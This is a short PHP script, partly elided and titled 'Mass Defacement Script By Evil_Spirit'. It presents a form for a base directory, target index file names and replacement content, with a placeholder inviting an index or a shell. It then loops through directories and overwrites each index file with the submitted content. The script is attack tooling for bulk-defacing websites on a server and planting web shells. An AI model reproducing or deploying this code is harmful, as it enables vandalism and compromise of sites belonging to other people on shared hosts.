...
Mass Defacement Script By Evil_Spirit

Contact => http://facebook.com/#
*/

echo "<title>- Mass Defacer -</title>";
echo "<center><form method='POST'>";
echo "Base Dir : <input type='text' name='base_dir' size='45' value='".getcwd ()."'><br><br>";
echo "File Name : <input type='text' name='file_name' value='index.php - index.html'><br><br>";
echo "Your Index : <br><textarea style='width: 785px; height: 330px;' name='index'>//Index yada Shell Buraya\\</textarea><br>";
	...
	foreach ($files as $file):
		if ($file != "." && $file != ".." && @filetype ($file) == "dir")
		{
			...
			if (file_put_contents ($index, $_POST['index']))
				echo "$index&nbsp&nbsp&nbsp&nbsp<span style='color: red'>OK'EY BRAT</span><br>";
		}
	endforeach;
}
